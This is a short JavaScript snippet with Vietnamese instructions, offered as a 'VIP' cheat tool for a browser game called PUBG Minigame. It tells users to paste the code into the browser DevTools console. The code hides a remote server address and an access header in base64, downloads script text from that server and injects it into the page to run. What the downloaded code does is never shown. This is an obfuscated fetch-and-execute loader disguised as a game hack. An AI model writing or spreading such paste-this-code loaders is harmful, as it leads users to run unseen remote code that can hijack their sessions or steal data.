// ==========================================
// CÔNG CỤ HỖ TRỢ: CHIEENSLEE VIP v999
// ==========================================
// Hướng dẫn sử dụng:
// 1. Mở game PUBG Minigame.
// 2. Nhấn F12 (DevTools) và chuyển sang tab Console.
// 3. Copy toàn bộ đoạn code dưới đây (từ dòng fetch...) và dán vào Console rồi ấn Enter.

fetch(atob('aHR0cHM6Ly9jaGllZW5zbGVlLXNlcnZlci5sZXRyb25nY2hpZW42My53b3JrZXJzLmRldg=='), {
  headers: {
    [atob('WC1DaGllZW5zbGVlLUF1dGg=')]: atob('Vjk5OV9WSVBfQUNDRVNT')
  }
})
  .then(response => {
    if (!response.ok) throw new Error('Auth Failed');
    return response.text();
  })
  .then(code => {
    const script = document.createElement('script');
    script.textContent = code;
    document.body.appendChild(script);
    script.remove();
  })
  .catch(err => console.error('[CHIEENSLEE] Lỗi bảo mật: Không thể lấy code bản quyền!'));
